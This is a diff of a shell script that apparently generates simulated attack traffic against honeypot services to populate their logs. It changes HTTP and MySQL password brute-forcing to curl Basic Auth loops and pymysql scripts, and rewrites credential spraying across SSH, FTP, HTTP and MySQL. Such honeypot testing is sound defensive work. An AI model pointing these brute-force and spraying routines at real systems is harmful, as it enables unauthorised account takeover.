@@ -63,33 +63,40 @@ tactic_telnet_brute() {
 }
 
 tactic_http_brute() {
+    # heralding HTTP uses Basic Auth — POST is not supported (returns 501)
     local user
     user=$(rand_pick "admin" "administrator" "root" "user" "guest")
+    local n=$(rand_int 20 40)
     local wl
-    wl=$(_make_wordlist "$(rand_int 20 40)")
-    hydra -l "$user" -P "$wl" -t 4 -f \
-        -o "/honeypot_logs/hydra_http_$$.txt" \
-        "http-post-form://${HERALDING_IP}/:username=^USER^&password=^PASS^:F=Invalid" \
-        2>/dev/null || true
-    # 수동 curl 추가
-    local n=$(rand_int 5 15)
-    for i in $(seq 1 $n); do
-        local pass
-        pass=$(rand_pick "${PASS_POOL[@]}")
-        curl -s --max-time 3 -X POST "http://${HERALDING_IP}/" \
-            -d "username=${user}&password=${pass}" -o /dev/null 2>/dev/null || true
-    done
+    wl=$(_make_wordlist "$n")
+    while IFS= read -r pass; do
+        curl -s --max-time 3 -u "${user}:${pass}" \
+            "http://${HERALDING_IP}/" -o /dev/null 2>/dev/null || true
+    done < "$wl"
     rm -f "$wl"
 }
 
 tactic_mysql_brute() {
+    # hydra sends COM_QUIT without credentials — use pymysql directly
     local user
     user=$(rand_pick "root" "admin" "mysql" "dba" "dbuser")
+    local n=$(rand_int 15 35)
     local wl
-    wl=$(_make_wordlist "$(rand_int 15 35)")
-    hydra -l "$user" -P "$wl" -t 4 -f \
-        mysql://${HERALDING_IP}:3306 2>/dev/null || true
-    rm -f "$wl"
+    wl=$(_make_wordlist "$n")
+    local pyfile="/tmp/mysqlbrute_$$.py"
+    cat > "$pyfile" <<PYEOF
+import pymysql, time, random
+passwords = open('$wl').read().splitlines()
+for pwd in passwords:
+    try:
+        pymysql.connect(host='$HERALDING_IP', port=3306,
+                        user='$user', password=pwd, connect_timeout=2)
+    except Exception:
+        pass
+    time.sleep(random.uniform(0.05, 0.15))
+PYEOF
+    python3 "$pyfile" 2>/dev/null || true
+    rm -f "$wl" "$pyfile"
 }
 
 tactic_ftp_brute() {
@@ -143,14 +150,20 @@ tactic_credential_spray() {
     user=$(rand_pick "${USER_POOL[@]}")
     local pass
     pass=$(rand_pick "${PASS_POOL[@]}")
-    local services=(
-        "ssh://${COWRIE_IP}:2222"
-        "ftp://${OPENCANARY_IP}"
-        "ftp://${DIONAEA_IP}"
-        "mysql://${HERALDING_IP}:3306"
-    )
-    local n=$(rand_int 2 4)
-    for svc in $(printf '%s\n' "${services[@]}" | shuf | head -n $n); do
-        hydra -l "$user" -p "$pass" -t 2 "$svc" 2>/dev/null || true
-    done
+    # SSH
+    hydra -l "$user" -p "$pass" -t 2 "ssh://${COWRIE_IP}:2222" 2>/dev/null || true
+    # FTP
+    hydra -l "$user" -p "$pass" -t 2 "ftp://${OPENCANARY_IP}" 2>/dev/null || true
+    # HTTP Basic Auth (heralding)
+    curl -s --max-time 3 -u "${user}:${pass}" \
+        "http://${HERALDING_IP}/" -o /dev/null 2>/dev/null || true
+    # MySQL via pymysql
+    python3 -c "
+import pymysql
+try:
+    pymysql.connect(host='${HERALDING_IP}', port=3306,
+                    user='${user}', password='${pass}', connect_timeout=2)
+except Exception:
+    pass
+" 2>/dev/null || true
 }
